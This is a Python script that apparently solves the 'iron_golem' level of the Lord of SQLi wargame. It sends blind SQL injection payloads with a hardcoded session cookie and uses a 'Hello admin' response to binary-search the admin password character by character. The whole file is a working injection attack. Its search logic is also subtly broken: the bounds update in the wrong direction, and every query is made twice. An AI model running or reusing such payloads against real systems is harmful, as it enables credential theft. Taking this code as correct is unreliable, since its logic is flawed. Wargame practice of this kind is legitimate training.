import requests

url='http://los.rubiya.kr/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php'
hdr={'Cookie':'PHPSESSID=e46srtpmi91qolstld3fbr4dn2'}

def equal(j,pw):
    data="?pw=' or id='admin' %26%26 ord(substr(pw,"+str(j)+",1)) = "+str(pw)+"%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("Hello admin") != -1:
        return True
    else:
        return False

def higher(j,pw):
    data="?pw=' or id='admin' %26%26 ord(substr(pw,"+str(j)+",1)) < "+str(pw)+"%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("Hello admin") != -1:
        return True
    else:
        return False

def lower(j,pw):
    data="?pw=' or id='admin' %26%26 ord(substr(pw,"+str(j)+",1)) > "+str(pw)+"%23"
    re=requests.get(url+data,headers=hdr)

    if re.text.find("Hello admin") != -1:
        return True
    else:
        return False
def PW(j,low,high):
    if low > high :
        return False

    else:
        mid=(low+high)//2
        print(mid)

        if equal(j,mid):
            return str(mid)
        elif higher(j,mid):
            high = mid+1
        elif lower(j,mid):
            low = mid-1

        return PW(j,low,high)


answer=''
for j in range(1,12):
    answer+=str(PW(j,44032,55203))
    print("패스 워드 : {}".format(str(PW(j,44032,55203))))

